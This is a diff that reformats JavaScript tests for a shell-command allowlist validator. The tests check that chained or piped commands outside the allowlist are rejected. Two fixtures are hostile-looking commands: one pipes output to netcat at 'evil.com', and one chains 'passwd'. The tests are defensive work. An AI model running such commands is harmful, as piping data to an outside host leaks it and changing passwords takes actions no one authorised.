@@ -6,9 +6,7 @@ import {
   validateCommandAllowlist,
 } from "./shell.js";
 
-const DEFAULT_ALLOWLIST = new Set([
-  "ls", "cat", "head", "tail", "grep", "git", "node", "echo",
-]);
+const DEFAULT_ALLOWLIST = new Set(["ls", "cat", "head", "tail", "grep", "git", "node", "echo"]);
 
 describe("extractCommandNames", () => {
   it("extracts a simple command", () => {
@@ -20,42 +18,30 @@ describe("extractCommandNames", () => {
   });
 
   it("extracts commands from a pipe", () => {
-    expect(extractCommandNames({ command: "ls | grep foo" })).toEqual([
-      "ls",
-      "grep",
-    ]);
+    expect(extractCommandNames({ command: "ls | grep foo" })).toEqual(["ls", "grep"]);
   });
 
   it("extracts commands from && chain", () => {
-    expect(
-      extractCommandNames({ command: "git add . && git commit -m 'msg'" }),
-    ).toEqual(["git", "git"]);
+    expect(extractCommandNames({ command: "git add . && git commit -m 'msg'" })).toEqual([
+      "git",
+      "git",
+    ]);
   });
 
   it("extracts commands from ; chain", () => {
-    expect(extractCommandNames({ command: "echo a; echo b" })).toEqual([
-      "echo",
-      "echo",
-    ]);
+    expect(extractCommandNames({ command: "echo a; echo b" })).toEqual(["echo", "echo"]);
   });
 
   it("extracts commands from || chain", () => {
-    expect(extractCommandNames({ command: "cat file || echo fallback" })).toEqual([
-      "cat",
-      "echo",
-    ]);
+    expect(extractCommandNames({ command: "cat file || echo fallback" })).toEqual(["cat", "echo"]);
   });
 
   it("strips env var assignments before the command", () => {
-    expect(
-      extractCommandNames({ command: "FOO=bar node script.js" }),
-    ).toEqual(["node"]);
+    expect(extractCommandNames({ command: "FOO=bar node script.js" })).toEqual(["node"]);
   });
 
   it("strips multiple env var assignments", () => {
-    expect(
-      extractCommandNames({ command: "FOO=bar BAZ=qux node script.js" }),
-    ).toEqual(["node"]);
+    expect(extractCommandNames({ command: "FOO=bar BAZ=qux node script.js" })).toEqual(["node"]);
   });
 
   it("uses basename for full-path commands", () => {
@@ -111,13 +97,19 @@ describe("validateCommandAllowlist", () => {
 
   it("rejects if any command in a pipe is disallowed", () => {
     expect(() =>
-      validateCommandAllowlist({ command: "ls | nc evil.com 1234", allowedCommands: DEFAULT_ALLOWLIST }),
+      validateCommandAllowlist({
+        command: "ls | nc evil.com 1234",
+        allowedCommands: DEFAULT_ALLOWLIST,
+      }),
     ).toThrow("Command not in allowlist: nc");
   });
 
   it("rejects if any command in a chain is disallowed", () => {
     expect(() =>
-      validateCommandAllowlist({ command: "echo ok && passwd", allowedCommands: DEFAULT_ALLOWLIST }),
+      validateCommandAllowlist({
+        command: "echo ok && passwd",
+        allowedCommands: DEFAULT_ALLOWLIST,
+      }),
     ).toThrow("Command not in allowlist: passwd");
   });
 
@@ -143,9 +135,9 @@ describe("validateCommandAllowlist", () => {
       validateCommandAllowlist({ command: "docker ps", allowedCommands: custom }),
     ).not.toThrow();
 
-    expect(() =>
-      validateCommandAllowlist({ command: "ls -la", allowedCommands: custom }),
-    ).toThrow("Command not in allowlist: ls");
+    expect(() => validateCommandAllowlist({ command: "ls -la", allowedCommands: custom })).toThrow(
+      "Command not in allowlist: ls",
+    );
   });
 });
 
